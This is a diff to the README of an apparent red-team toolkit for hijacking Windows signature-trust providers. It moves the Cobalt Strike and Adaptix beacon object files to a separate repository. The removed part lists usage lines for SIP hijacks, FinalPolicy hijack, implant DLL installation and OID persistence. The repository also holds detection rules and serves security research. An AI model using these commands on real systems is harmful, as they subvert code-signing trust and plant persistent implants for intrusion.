@@ -21,23 +21,13 @@ TrustMeBro/
 ├── tools/
 │   └── FormatGhost/                    CryptDllFormatObject persistence tool
 ├── detection/                          YARA and Sigma detection rules
-├── bofs/                               Beacon Object Files (Cobalt Strike + Adaptix)
-│   ├── include/                        beacon.h + tmb_bof.h shared header
-│   ├── src/                            8 BOF source files
-│   ├── bin/                            Compiled .o files
-│   ├── cna/tmb.cna                     Cobalt Strike aggressor script
-│   └── axscript/tmb.axscript           Adaptix C2 extension
-├── experimental/
-│   ├── publisher-spoof/                Publisher name spoofing research
-│   └── dual-signerinfo/                Dual SignerInfo parser-divergence research
-├── docs/
-│   ├── SIP_COMPLETE_MAP.md             Full 19-GUID SIP reference
-│   └── *.svg                           Technique diagrams
 ├── bin/                                Pre-compiled Windows binaries
 ├── TrustMeBro.py                       Python cross-platform tool
 ├── LICENSE
 └── README.md
 ```
+
+> **Beacon Object Files** are in a separate repo: [TrustMeBOF](https://github.com/KriyosArcane/TrustMeBOF). Clone it, run `make`, and load `cna/tmb.cna` (Cobalt Strike) or `axscript/tmb.axscript` (Adaptix).
 
 ---
 
@@ -280,47 +270,14 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\TrustMeBro\Tru
 
 ## Beacon Object Files (Cobalt Strike + Adaptix)
 
-8 individual BOFs under `bofs/`. Each is a standalone object file that runs inside the beacon process. Load `bofs/cna/tmb.cna` in Cobalt Strike or `bofs/axscript/tmb.axscript` in Adaptix.
+8 BOFs in a separate repo: [TrustMeBOF](https://github.com/KriyosArcane/TrustMeBOF)
 
-> **Log out and log back in** after any registry operation. SIP and Trust Provider values are cached per-process.
-
-| Command | BOF | What it does |
-|---|---|---|
-| `tmb_probe` | tmb_probe.o | CI flag recon. No writes. No admin. |
-| `tmb_finalpolicy` | tmb_finalpolicy.o | FinalPolicy hijack/clean (1 registry write) |
-| `tmb_sip_hijack` | tmb_sip_hijack.o | Multi-GUID SIP hijack with named aliases |
-| `tmb_wow64_hijack` | tmb_wow64_hijack.o | WOW6432Node-only SIP hijack |
-| `tmb_custom_provider` | tmb_custom_provider.o | Custom action GUID with SoftpubCleanup |
-| `tmb_sip_exec` | tmb_sip_exec.o | SIP execution surface implant install/remove |
-| `tmb_clean` | tmb_clean.o | Scoped artifact cleanup |
-| `tmb_formatghost` | tmb_formatghost.o | CryptDllFormatObject OID persistence |
-
-GUID aliases work in all BOFs: `pe`, `ps1`, `jscript`, `vbscript`, `wsf`, `cab`, `catalog`, `appx`, `appx-bundle`, `msi`, `ctl`, `esd`, `sac`
-
-```
-tmb_probe
-tmb_finalpolicy
-tmb_finalpolicy --clean
-tmb_sip_hijack --sip-types pe,ps1,msi
-tmb_sip_hijack --all-sips --sac
-tmb_sip_hijack --clean
-tmb_wow64_hijack --sip-types all
-tmb_custom_provider {GUID}
-tmb_custom_provider --clean {GUID}
-tmb_sip_exec install --dll C:\Temp\implant.dll --guid pe
-tmb_sip_exec remove --guid pe
-tmb_clean --all
-tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\Temp\handler.dll
-tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --clean
-```
-
-Build all BOFs:
 ```bash
-for f in bofs/src/tmb_*.c; do
-  name=$(basename "$f" .c)
-  x86_64-w64-mingw32-gcc -o "bofs/bin/${name}.o" -c "$f" -I bofs/include -Wall -Wno-unused-function
-done
+git clone https://github.com/KriyosArcane/TrustMeBOF.git
+cd TrustMeBOF && make
 ```
+
+Load `cna/tmb.cna` in Cobalt Strike or `axscript/tmb.axscript` in Adaptix. Commands: `tmb_probe`, `tmb_finalpolicy`, `tmb_sip_hijack`, `tmb_wow64_hijack`, `tmb_custom_provider`, `tmb_sip_exec`, `tmb_clean`, `tmb_formatghost`. See the [TrustMeBOF README](https://github.com/KriyosArcane/TrustMeBOF) for full usage.
 
 ---
 
